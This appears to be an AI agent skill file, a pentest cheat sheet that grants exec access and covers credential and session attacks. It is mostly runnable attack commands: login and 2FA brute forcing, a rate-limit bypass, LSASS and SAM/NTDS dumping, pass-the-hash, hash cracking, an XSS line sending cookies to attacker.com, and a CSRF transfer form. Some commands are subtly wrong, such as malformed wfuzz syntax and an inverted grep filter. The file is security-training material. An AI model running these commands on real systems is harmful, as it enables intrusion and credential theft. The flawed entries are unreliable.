---
name: cpts-auth-credential-attacks
description: "CPTS Authentication & Credential Attacks: broken authentication flaws, login brute forcing, password attacks (online/offline), password cracking (hashcat, john), and session security (session hijacking, fixation, cookies). Use when testing authentication mechanisms or cracking credentials."
argument-hint: "[target] [attack-type]"
allowed-tools:
  - read
  - grep
  - glob
  - exec
  - webfetch
triggers:
  - user
  - model
---

> ⚠️ **AUTHORIZED USE ONLY**
>
> This skill is provided for **authorized penetration testing and security education only**. Only use these techniques against systems you own or have **explicit written permission** to test. Unauthorized access to computer systems is illegal. The authors and maintainers assume no liability for misuse of this information. Always adhere to applicable laws, scope agreements, and rules of engagement.

---

# CPTS Authentication & Credential Attacks

**Purpose:** A comprehensive reference for testing authentication mechanisms and attacking credentials. Covers broken authentication flaws, login brute forcing, online/offline password attacks, password cracking (Hashcat, John the Ripper), and session security (session hijacking, fixation, cookie attacks, CSRF, XSS-based session theft).

---

## Table of Contents

1. [Broken Authentication](#1-broken-authentication)
2. [Login Brute Forcing](#2-login-brute-forcing)
3. [Password Attacks](#3-password-attacks)
4. [Password Cracking](#4-password-cracking)
5. [Session Security](#5-session-security)

---

## 1. Broken Authentication

### Categories of Authentication

#### Knowledge
- **Passwords, PINs, Security Questions.**
- Password complexity policies, password storage (hashing, salting), and password managers.

#### Ownership
- **ID Cards, TOTP (Time-based One-Time Password), Hardware Tokens.**
- The TOTP algorithm, U2F/FIDO2 keys, and smart cards.

#### Inherence
- **Biometric Authentication (Fingerprint, Facial Recognition, Iris Scan).**
- Accuracy and security of different biometric methods, vulnerabilities like spoofing.

### User Enumeration

Identifying valid usernames. Common techniques include response time analysis, error message analysis, and social engineering.

#### Using Nmap (Replace target.com and port with your target)

```bash
nmap -p <port> --script http-enum-users.nse target.com
```

#### Using Wfuzz (Replace USERNAME_LIST with a wordlist)

```bash
wfuzz -c -z file,USERNAME_LIST -w target.com/login?username=FUZZ
```

### Brute-Forcing Passwords

Trying multiple password combinations. Dictionary attacks, hybrid attacks, and rainbow table attacks. Tools like Hydra and Hashcat.

#### Using Hydra (Replace username, password_list, and target)

```bash
hydra -l username -P password_list target.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
```

#### Using Hashcat (For Offline Password Cracking)

```bash
hashcat -m <hash_type> <hash_file> <wordlist>
```

### Brute-Forcing Password Reset Tokens

Trying different reset token values. Weak or predictable token generation exploitation.

#### Using Wfuzz (Replace TOKEN_LIST)

```bash
wfuzz -c -z file,TOKEN_LIST target.com/reset?token=FUZZ
```

### Brute-Forcing 2FA Codes

Trying many 2FA code combinations. Time window vulnerabilities, rate limiting importance.

#### Using a Custom Script (Python Example)

```python
import itertools
import requests

url = "https://target.com/2fa"
headers = {"Content-Type": "application/json"}

for code in itertools.product("0123456789", repeat=6):
    payload = {"otp": "".join(code)}
    response = requests.post(url, json=payload, headers=headers)
    if "success" in response.text:
        print("Valid 2FA Code Found:", "".join(code))
        break
```

### Bypassing Brute-Force Protection

#### Rate Limit
- **X-Forwarded-For HTTP Header Manipulation.**
- Other header manipulations and distributed brute-force attacks.

##### Using Curl (Modify Headers)

```bash
curl -H "X-Forwarded-For: 1.2.3.4" target.com/login
```

#### CAPTCHAs
- Looking for CAPTCHA solutions in HTML code.
- CAPTCHA bypass techniques and machine learning for solving.

### Password Attacks (Default Credentials & Reset)

#### Default Credentials
- **Sources:** [CIRT.net](https://www.cirt.net/passwords), [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials), [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master).
- Changing default credentials immediately.

#### Vulnerable Password Reset
- **Issues:** Guessable security questions, username injection in reset requests.
- Importance of strong security questions and robust reset mechanisms.

### Authentication Bypasses

#### Accessing Protected Pages Directly
- Improper access control vulnerabilities.

#### Manipulating HTTP Parameters
- Parameter tampering and SQL injection.

### Session Attacks (Broken Auth Context)

#### Brute-Forcing Cookies with Insufficient Entropy
- Importance of cryptographically secure session ID generation.

##### Using Wfuzz (Very Time Consuming) — Replace COOKIE_LIST

```bash
wfuzz -c -b "sessionid=FUZZ" target.com/protected_page -z file,COOKIE_LIST
```

#### Session Fixation

**Attacker Sets Session ID:**

```bash
curl -b "sessionid=attacker_session_id" target.com
```

_Then coerces the victim to use that same session ID._

1. Attacker obtains a valid session identifier.
2. Attacker coerces the victim to use this session identifier (social engineering).
3. Victim authenticates to the vulnerable web application.
4. Attacker hijacks the victim's session.

**Prevention:** Regenerating session IDs after login.

#### Improper Session Timeout
- Sessions should expire after an appropriate time interval.
- Best practices for session timeout management and secure session storage.

### Additional Examples

#### Nmap Scan

```bash
nmap -sV -sC target.com # Version and default scripts.
```

#### Directory Brute Force

```bash
gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

#### SQLMap Scan

```bash
sqlmap -u "target.com/page.php?id=1" --dbs # Database Enumeration
```

#### Nikto Scan

```bash
nikto -h target.com
```

#### Burp Suite Intruder Attack for Fuzzing

_Burp Suite is a GUI tool but provides many command-line options._

### Additional Considerations

- **MFA Implementation Flaws:** Weak MFA can lead to vulnerabilities.
- **WAF Bypasses:** Attackers may bypass WAFs to exploit authentication vulnerabilities.
- **OAuth/OpenID Connect Vulnerabilities:** Misconfigurations can lead to account takeover.
- **JWT Vulnerabilities:** Weak validation can result in security issues.
- **SSO Vulnerabilities:** Weak SSO implementations can compromise multiple applications.
- **Client-Side Vulnerabilities:** Storing sensitive data locally, client-side validation bypasses.

---

## 2. Login Brute Forcing

### What is Brute Forcing?

A trial-and-error method used to crack passwords, login credentials, or encryption keys by systematically trying every possible combination of characters.

### Factors Influencing Brute Force Attacks

- Complexity of the password or key
- Computational power available to the attacker
- Security measures in place

### How Brute Forcing Works

1. **Start**: The attacker initiates the brute force process.
2. **Generate Possible Combination**: The software generates a potential password or key combination.
3. **Apply Combination**: The generated combination is attempted against the target system.
4. **Check if Successful**: The system evaluates the attempted combination.
5. **Access Granted (if successful)**: The attacker gains unauthorized access.
6. **End (if unsuccessful)**: The process repeats until the correct combination is found or the attacker gives up.

### Types of Brute Forcing

| Attack Type | Description | Best Used When |
|---|---|---|
| Simple Brute Force | Tries every possible character combination in a set. | No prior information about the password. |
| Dictionary Attack | Uses a pre-compiled list of common passwords. | The password is likely weak or common. |
| Hybrid Attack | Combines brute force and dictionary attacks. | Target uses modified common passwords. |
| Credential Stuffing | Uses leaked credentials from other breaches. | Target may reuse passwords. |
| Password Spraying | Attempts common passwords across many accounts. | Account lockout policies are in place. |
| Rainbow Table Attack | Uses precomputed tables of password hashes. | Cracking a large number of password hashes. |
| Reverse Brute Force | Targets a known password against multiple usernames. | Password reuse is suspected. |
| Distributed Brute Force | Distributes attempts across multiple machines. | Password is complex, and one machine isn't enough. |

### Default Credentials

| Device | Username | Password |
|---|---|---|
| Linksys Router | admin | admin |
| Netgear Router | admin | password |
| TP-Link Router | admin | admin |
| Cisco Router | cisco | cisco |
| Ubiquiti UniFi AP | ubnt | ubnt |

### Brute-Forcing Tools

#### Hydra

- Fast network login cracker.
- Supports numerous protocols.
- Uses parallel connections for speed.
- Flexible and adaptable.

```bash
hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE [service://server[:PORT][/OPT]]
```

**Examples:**

```bash
hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100
hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100
hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

#### Medusa

- Fast, massively parallel, modular login brute-forcer.
- Supports a wide array of services.

```bash
medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
```

**Examples:**

```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5
medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp
```

### Custom Wordlists

#### Username Anarchy

```bash
username-anarchy Jane Smith
username-anarchy -i names.txt
username-anarchy -a --country us
username-anarchy -l
username-anarchy -f format1,format2
username-anarchy -@ example.com
username-anarchy --case-insensitive
```

#### CUPP (Common User Passwords Profiler)

```bash
cupp -i
cupp -w profiles.txt
cupp -l
```

### Password Policy Filtering

| Policy Requirement | Grep Regex Pattern | Explanation |
|---|---|---|
| Minimum Length (8 characters) | `grep -E '^.{8,}$' wordlist.txt` | At least 8 characters long. |
| At Least One Uppercase Letter | `grep -E '[A-Z]' wordlist.txt` | Contains uppercase letters. |
| At Least One Lowercase Letter | `grep -E '[a-z]' wordlist.txt` | Contains lowercase letters. |
| At Least One Digit | `grep -E '[0-9]' wordlist.txt` | Contains digits. |
| At Least One Special Character | `grep -E '[!@#$%^&*()_+-=[]{};':",.<>/?]' wordlist.txt` | Contains special characters. |
| No Consecutive Repeated Characters | `grep -E '(.)\1' wordlist.txt` | Avoids repeated characters. |
| Exclude Common Patterns | `grep -v -i 'password' wordlist.txt` | Excludes common patterns. |
| Exclude Dictionary Words | `grep -v -f dictionary.txt wordlist.txt` | Excludes dictionary words. |
| Combination of Requirements | `grep -E '^.{8,}$' wordlist.txt \| grep -E '[A-Z]'` | Combine multiple requirements. |

---

## 3. Password Attacks

### Password Mutations

```bash
# Generate a wordlist from a website
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

# Generate rule-based word list using Hashcat
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Generate potential usernames using username-anarchy
./username-anarchy -i /path/to/listoffirstandlastnames.txt

# Download a list of file extensions for password searching
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

### Remote Password Attacks

```bash
# Brute-force WinRM service
crackmapexec winrm <ip> -u user.list -p password.list

# Enumerate SMB shares using specified credentials
crackmapexec smb <ip> -u "user" -p "password" --shares

# Attempt password cracking over specified service with Hydra
hydra -L user.list -P password.list <service>://<ip>
hydra -l username -P password.list <service>://<ip>
hydra -L user.list -p password <service>://<ip>
hydra -C <user_pass.list> ssh://<IP>

# Dump password hashes using CrackMapExec
crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa
crackmapexec smb <ip> -u <username> -p <password> --ntds

# Establish a PowerShell session using Evil-WinRM
evil-winrm -i <ip> -u Administrator -H "<passwordhash>"
```

### Windows Local Password Attacks

```powershell
# List running processes
tasklist /svc

# Search files for "password"
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Dump LSASS process
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Extract credentials from LSASS dump
pypykatz lsa minidump /path/to/lsassdumpfile

# Save and move registry hives
reg.exe save hklm\sam C:\sam.save
move sam.save \\<ip>\NameofFileShare

# Dump password hashes using secretsdump.py
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Create volume shadow copy and copy NTDS.dit
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

### Linux Local Password Attacks

```bash
# Find configuration files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done

# Search for credentials in files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done

# Find common database files
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done

# Search for text files
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Search for private keys
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# Extract last 5 lines from bash history
tail -n5 /home/*/.bash*
```

### Cracking Passwords (from Password Attacks context)

```bash
# Crack NTLM hashes with Hashcat
hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt

# Crack single NTLM hash and show results
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show

# Combine passwd and shadow files for cracking
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Crack unshadowed hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Extract SSH key hashes and crack them
python3 ssh2john.py SSH.private > ssh.hash
john ssh.hash --show

# Extract and crack Office file hashes
office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash

# Crack PDF and ZIP file hashes
pdf2john.pl PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash

# Extract and crack BitLocker hashes
bitlocker2john -i Backup.vhd > backup.hashes

# Decrypt encrypted files with OpenSSL
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
```

---

## 4. Password Cracking

### Notes

- Use `seclists/Names/names.txt` for finding names / user enumeration.
- Password spraying: `crackmapexec`, `smb`, `winrm`, `rdp`.

### John the Ripper

```shell
john --format <hash format> --wordlist <password list> <hash file>
```

Common flags:
- `--format <hash format>` — specify the hash format (e.g., `raw-md5`, `raw-sha1`, `nt`, `bcrypt`, `sha512crypt`).
- `--wordlist <password list>` — specify the wordlist to use.
- `--show` — display cracked passwords for a hash file.

### Hashcat

```shell
hashcat -a 0 -m <hash_mode> <hash_file> <wordlist> [options]
```

Common flags:
- `-a 0` — Brute force / dictionary attack mode (straight).
- `-m <hash_mode>` — Hash type mode (check `hashcat --help` for available modes).
- `--force` — For non-native GPU support.
- `--rule <mangling rules>` — Apply mangling rules to the wordlist.
- `-r <rule file>` — Specify a rule file for mutations.
- `--stdout` — Output candidate passwords without cracking (useful for wordlist generation).
- `-o <output file>` — Write cracked hashes to a file.
- `--show` — Show already cracked passwords.

### Common Hashcat Hash Modes (-m)

| Mode | Hash Type |
|---|---|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1800 | sha512crypt ($6$) |
| 1000 | NTLM |
| 5600 | NetNTLMv2 |
| 13100 | Kerberoasting (Kerberos TGS) |
| 18200 | Kerberos AS-REP (ASREP-Roast) |
| 16800 | WPA-PMKID |
| 22000 | WPA-PBKDF2-PMKID+EAPOL |
| 3200 | bcrypt ($2a$) |

### Password Cracking Workflow Examples

```bash
# Generate a rule-based wordlist with Hashcat
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Crack NTLM hashes
hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt

# Crack Linux /etc/shadow hashes (sha512crypt)
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Crack SSH private key passphrase
python3 ssh2john.py SSH.private > ssh.hash
john ssh.hash --show

# Crack Office document password
office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash

# Crack PDF file password
pdf2john.pl PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash

# Crack ZIP file password
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash

# Crack BitLocker
bitlocker2john -i Backup.vhd > backup.hashes

# Decrypt OpenSSL-encrypted files by iterating a wordlist
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
```

---

## 5. Session Security

### Introduction to Sessions

#### Stateless HTTP

HTTP is stateless, meaning each request is treated independently. Web applications use sessions to maintain user state across multiple requests.

#### Session Identifiers (Session IDs)

- Unique tokens that identify a user's session.
- Stored in cookies, URL parameters, or HTML.
- Each storage method has security implications.

#### Session ID Security Best Practices

- **Uniqueness:** Each session ID should be unique to prevent duplication.
- **Randomness:** Must be generated using a strong random number generator.
- **Expiration:** Should expire after a reasonable time to reduce risk.

### Common Session Attacks

#### Session Hijacking

**Concept:** An attacker obtains a valid session ID to impersonate a user.

**Example:** Using `curl` with a captured session cookie:

```bash
curl -b "sessionid=captured_session_id" https://target.com/protected_page
```

**Example:** Using a browser's cookie editor to inject a session ID manually.

#### Session Fixation

**Concept:** An attacker sets a session ID and forces the victim to use it.

**Example:** Attacker assigns a session ID:

```bash
curl -b "sessionid=attacker_session_id" https://target.com/
```

#### Cross-Site Scripting (XSS) - Session ID Theft

**Concept:** Injected JavaScript can steal session IDs.

**Example:** Injecting JavaScript to steal cookies:

```html
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

**Example:** Using `curl` to test for reflected XSS:

```bash
curl "https://target.com/page?param=<script>alert(1)</script>"
```

#### Cross-Site Request Forgery (CSRF)

**Concept:** Tricks a user into performing an action they did not intend while authenticated.

**Example:** Malicious HTML form to trigger CSRF attack:

```html
<form action="https://target.com/transfer" method="POST">
  <input type="hidden" name="account" value="attacker_account">
  <input type="hidden" name="amount" value="1000">
  <input type="submit" value="Transfer Money">
</form>
```

**Example:** Using `curl` to send a CSRF request:

```bash
curl -X POST -d "account=attacker_account&amount=1000&csrf_token=known_token" https://target.com/transfer
```

#### Open Redirects

**Concept:** Redirecting users to malicious sites.

**Example:** Testing for open redirects using `curl`:

```bash
curl -i "https://target.com/redirect?url=https://attacker.com"
```

**Example:** Using `wfuzz` to fuzz for open redirect vulnerabilities:

```bash
wfuzz -c -z file,redirect_urls.txt https://target.com/redirect?url=FUZZ
```

### /etc/hosts File Manipulation for Lab Environments

#### Adding Host Entries

**Single entry:**

```bash
echo "<TARGET_IP> target.com" | sudo tee -a /etc/hosts
```

**Multiple entries:**

```bash
IP="<TARGET_IP>"
echo -e "$IP\txss.htb.net\n$IP\tcsrf.htb.net\n$IP\toredirect.htb.net\n$IP\tminilab.htb.net" | sudo tee -a /etc/hosts
```

**Viewing file contents:**

```bash
cat /etc/hosts
```

**Editing the file:**

```bash
sudo nano /etc/hosts
# or
sudo vim /etc/hosts
```

### Essential Security Tools

#### Nmap - Network Scanning

```bash
nmap -sV -sC https://target.com
```

#### Gobuster - Directory Brute Forcing

```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

#### SQLmap - SQL Injection Detection

```bash
sqlmap -u "https://target.com/page.php?id=1" --dbs
```

#### Nikto - Web Server Scanning

```bash
nikto -h https://target.com
```

#### Burp Suite

- **Burp Intruder:** Automated fuzzing and brute-forcing.
- **Burp Repeater:** Manually crafting and replaying HTTP requests.
- **Burp Scanner:** Automated vulnerability scanning.

### Security Best Practices

- Use **strong, randomly generated** session IDs.
- Store session IDs securely with **HTTPOnly** and **Secure** flags.
- Implement **CSRF protection** using tokens.
- Validate and sanitize **all user input**.
- Use **output encoding** to prevent XSS.
- Regenerate session IDs after login and sensitive actions.
- Implement proper **session timeouts**.
- Use **HTTPS** for all communication.
- Consider deploying a **Web Application Firewall (WAF)**.

---

## Quick Reference - Key Tools & Commands

| Task | Tool | Command Example |
|---|---|---|
| User enumeration | Nmap | `nmap -p <port> --script http-enum-users.nse target.com` |
| User enumeration | Wfuzz | `wfuzz -c -z file,USER_LIST -w target.com/login?username=FUZZ` |
| HTTP form brute force | Hydra | `hydra -l user -P pass_list target.com http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| SSH brute force | Hydra | `hydra -l root -P pass_list.txt ssh://192.168.1.100` |
| FTP brute force | Medusa | `medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp -t 5` |
| RDP brute force | Medusa | `medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp` |
| SMB password spray | CrackMapExec | `crackmapexec smb <ip> -u user.list -p password.list` |
| WinRM brute force | CrackMapExec | `crackmapexec winrm <ip> -u user.list -p password.list` |
| WinRM shell (pass-the-hash) | Evil-WinRM | `evil-winrm -i <ip> -u Administrator -H "<hash>"` |
| Wordlist from website | CeWL | `cewl https://target.com -d 4 -m 6 --lowercase -w out.txt` |
| Rule-based mutation | Hashcat | `hashcat --force password.list -r custom.rule --stdout > mut.txt` |
| NTLM crack | Hashcat | `hashcat -m 1000 hashes.txt rockyou.txt` |
| Linux shadow crack | Hashcat | `hashcat -m 1800 -a 0 unshadowed.hashes rockyou.txt -o cracked.txt` |
| SSH key crack | John | `python3 ssh2john.py id_rsa > ssh.hash && john ssh.hash --wordlist=rockyou.txt` |
| PDF crack | John | `pdf2john.pl file.pdf > pdf.hash && john --wordlist=rockyou.txt pdf.hash` |
| ZIP crack | John | `zip2john file.zip > zip.hash && john --wordlist=rockyou.txt zip.hash` |
| LSASS dump | rundll32 | `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full` |
| LSASS parse | pypykatz | `pypykatz lsa minidump /path/to/lsassdumpfile` |
| SAM dump | secretsdump | `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` |
| Session hijack test | curl | `curl -b "sessionid=captured_id" https://target.com/protected` |
| Rate-limit bypass | curl | `curl -H "X-Forwarded-For: 1.2.3.4" target.com/login` |
| Cookie brute force | Wfuzz | `wfuzz -c -b "sessionid=FUZZ" target.com/page -z file,COOKIE_LIST` |
| Open redirect test | curl | `curl -i "https://target.com/redirect?url=https://attacker.com"` |

---

*Source: HTB CPTS Notes — Authentication & Credential Attacks section. Synthesized for authorized security testing and education.*
